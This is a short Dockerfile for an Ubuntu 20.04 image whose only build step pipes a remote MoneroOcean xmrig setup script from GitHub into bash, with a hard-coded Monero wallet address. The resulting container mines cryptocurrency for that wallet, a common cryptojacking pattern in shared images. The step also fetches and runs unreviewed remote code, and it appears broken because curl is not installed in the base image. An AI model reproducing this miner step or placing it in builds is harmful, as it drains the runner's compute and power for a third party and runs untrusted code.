#Download base image ubuntu 20.04
FROM ubuntu:20.04

LABEL maintainer="zaplotuj@gmail.com"
LABEL version="0.1"
LABEL description="This is custom Docker Image for \
the miner download curl ."

RUN curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 85Vk6wJgVJGQ1394EDLZpKWVRMovnKXbJbcFB9fDhr9Fc99QQWBJLGGh8NPLXesfr6SLCzWCuh2jTcJYsVp1ZpG62pA8Dcd

EXPOSE 3000
